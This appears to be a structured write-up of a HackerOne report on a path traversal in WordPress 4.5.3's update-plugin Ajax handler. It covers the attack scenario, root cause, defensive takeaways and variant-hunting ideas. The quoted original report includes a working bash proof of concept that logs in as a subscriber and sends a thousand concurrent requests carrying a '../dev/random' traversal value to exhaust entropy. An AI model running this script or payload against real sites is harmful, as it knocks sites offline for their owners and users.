# WordPress Authentication Denial of Service via Path Traversal in Core Ajax Handlers

## Metadata
- **Source:** HackerOne
- **Report:** 163307 | https://hackerone.com/reports/163307
- **Submitted:** 2016-08-25
- **Reporter:** clizsec
- **Program:** WordPress
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Path Traversal, Denial of Service, Entropy Depletion, CSRF
- **CVEs:** None
- **Category:** memory-binary

## Summary
A path traversal vulnerability exists in WordPress 4.5.3 Core Ajax handlers that allows authenticated users (Subscriber role) to read arbitrary files and cause denial of service by exhausting system entropy through repeated reads of /dev/random. The vulnerability can be exploited via CSRF since nonce validation occurs too late in the request handling flow.

## Attack scenario
1. Attacker creates low-privilege subscriber account or uses existing one on target WordPress site
2. Attacker sends malicious AJAX request to wp-admin/admin-ajax.php with traversal payload (e.g., plugin=../../../../../../dev/random&action=update-plugin)
3. Vulnerable code processes path traversal without proper sanitization and reads from /dev/random
4. Attacker launches automated script making hundreds/thousands of concurrent requests to exhaust entropy pool
5. /dev/random blocks as entropy depletes, causing PHP scripts to hang and site becomes unresponsive
6. Site remains unavailable until system entropy is restored through entropy generation or restart

## Root cause
Insufficient input validation and path traversal filtering in WordPress Core Ajax handler (update-plugin action). The nonce check is performed after file operations begin, allowing exploitation. No proper canonicalization or restricted path enforcement for plugin parameter.

## Attacker mindset
Low-skill attacker can exploit this with simple bash script and basic subscriber credentials. The vulnerability is trivial to exploit, making it attractive for disruption campaigns. Authentication requirement is minimal barrier since many sites allow public registration.

## Defensive takeaways
- Implement strict whitelist validation for file path parameters rather than blacklist approach
- Perform nonce and capability checks BEFORE any file operations or processing
- Use basename() or realpath() with chroot-like directory constraints to prevent traversal
- Disable arbitrary file reads from system paths like /dev/random in plugin handlers
- Implement rate limiting on AJAX endpoints to prevent resource exhaustion attacks
- Restrict subscriber role capabilities for sensitive admin-ajax actions
- Monitor entropy pool levels and implement alerts for suspicious /dev/random access patterns
- Apply principle of least privilege - plugin handlers should not read outside designated plugin directories

## Variant hunting
Search for similar path traversal in other AJAX handlers (update-theme, update-core). Check if other file operations (fopen, file_get_contents, readfile) are similarly vulnerable. Test other pseudo-device files (/dev/zero, /dev/urandom). Verify if CSRF exploitation works without full login via stored XSS or social engineering.

## MITRE ATT&CK
- T1190
- T1083
- T1021
- T1526
- T1499

## Notes
This report demonstrates a practical DoS technique using entropy exhaustion - a sophisticated attack vector that goes beyond simple resource flooding. The CSRF component adds severity since it can be triggered without user interaction. The vulnerability affects any authenticated user including newly registered subscribers, making exploitation accessible. Patch was released in WordPress 4.5.4.

## Full report
<details><summary>Expand</summary>

Hi,
I found out that you are using WordPress version 4.5.3.

Researchers found out 5 days ago, that this version has a vulnerability, a Path traversal in WordPress Core Ajax handlers.

_Intro_
WordPress is web software that can be used to create a website, blog, or app. A path traversal vulnerability exists in the Core Ajax handlers of the WordPress Admin API. This issue can (potentially) be used by an authenticated user (Subscriber) to create a denial of service condition of an affected WordPress site.

_Description_
Potentially this issue can be used to disclose information, provided that the target file contains a line with Version:. What is more important that it also allows for a denial of service condition as the logged in attacker can use this flaw to read up to 8 KB of data from /dev/random. Doing this repeatedly will deplete the entropy pool, which causes /dev/random to block; blocking the PHP scripts. Using a very simple script, it is possible for an authenticated user (Subscriber) to bring down a WordPress site. It is also possible to trigger this issue via Cross-Site Request Forgery as the nonce check is done too late in this case.

_PoC Script_
```
#!/bin/bash
target="http://<target>"
username="subscriber"
password="password"
cookiejar=$(mktemp)
   
# login
curl --cookie-jar "$cookiejar" \
   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
   "$target/wp-login.php" \
   >/dev/null 2>&1
   
# exhaust apache
for i in `seq 1 1000`
   do
      curl --cookie "$cookiejar" \
      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
      "$target/wp-admin/admin-ajax.php" \
      >/dev/null 2>&1 &
done
   
rm "$cookiejar"
```

Link: 
```
https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html
```

I hope that I helped you.


</details>

---
*Analysed by Claude on 2026-05-24*
